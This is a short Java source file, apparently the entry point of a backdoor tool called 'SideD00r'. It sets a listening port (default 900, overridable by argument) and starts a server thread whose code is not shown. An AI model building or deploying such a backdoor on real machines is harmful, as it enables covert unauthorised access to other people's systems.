package me.aaronakhtar.sided00r;

import me.aaronakhtar.sided00r.threads.SideD00rServer;

/**
 * You cannot hide from SideD00r...
 */
public class SideD00r {

    public static int sd_port = 900; // modify if you want to change the sidedoor port, or optionally enter your target port in args[0] param.

    public static void main(String[] args) throws Exception {
        if (args.length > 0){
            try {
                sd_port = Integer.parseInt(args[0]);
            }catch (Exception e){}
        }
        new Thread(new SideD00rServer()).start();
    }


}
